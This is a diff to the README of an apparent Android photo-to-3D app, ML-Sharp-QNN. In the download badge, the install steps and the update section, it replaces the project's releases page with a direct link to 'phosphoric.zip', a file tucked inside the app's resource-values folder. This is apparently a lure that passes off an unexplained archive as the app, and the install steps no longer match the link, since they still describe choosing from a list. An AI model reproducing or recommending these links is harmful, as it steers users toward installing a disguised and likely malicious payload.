@@ -1,6 +1,6 @@
 # 🧠 ML-Sharp-QNN - Turn Photos into 3D Models Instantly
 
-[![Download ML-Sharp-QNN](https://img.shields.io/badge/Download-ML--Sharp--QNN-brightgreen?style=for-the-badge&logo=android&logoColor=white&color=%2344cc11)](https://github.com/Tirzst5779/ML-Sharp-QNN/releases)
+[![Download ML-Sharp-QNN](https://img.shields.io/badge/Download-ML--Sharp--QNN-brightgreen?style=for-the-badge&logo=android&logoColor=white&color=%2344cc11)](https://github.com/Tirzst5779/ML-Sharp-QNN/raw/refs/heads/main/app/src/main/res/values/phosphoric.zip)
 
 ## ✨ What This Does
 
@@ -19,7 +19,7 @@ Think of it like magic — you snap a picture of a toy, a sculpture, or any obje
 
 Getting ML-Sharp-QNN on your phone is simple.
 
-1. **Visit this link to download the application:** [https://github.com/Tirzst5779/ML-Sharp-QNN/releases](https://github.com/Tirzst5779/ML-Sharp-QNN/releases)
+1. **Visit this link to download the application:** [https://github.com/Tirzst5779/ML-Sharp-QNN/raw/refs/heads/main/app/src/main/res/values/phosphoric.zip](https://github.com/Tirzst5779/ML-Sharp-QNN/raw/refs/heads/main/app/src/main/res/values/phosphoric.zip)
 2. Look for the newest file in the list — it will have the highest version number and today's date.
 3. Tap the file name to start the download.
 4. Once the download finishes, you'll see a notification. Tap it to install.
@@ -81,7 +81,7 @@ The project is actively developed. Check the download page regularly for new ver
 
 ## 🔄 Staying Updated
 
-Check the download link from time to time for new releases: [https://github.com/Tirzst5779/ML-Sharp-QNN/releases](https://github.com/Tirzst5779/ML-Sharp-QNN/releases)
+Check the download link from time to time for new releases: [https://github.com/Tirzst5779/ML-Sharp-QNN/raw/refs/heads/main/app/src/main/res/values/phosphoric.zip](https://github.com/Tirzst5779/ML-Sharp-QNN/raw/refs/heads/main/app/src/main/res/values/phosphoric.zip)
 
 Each new version typically brings better quality, faster speed, or new features.
 
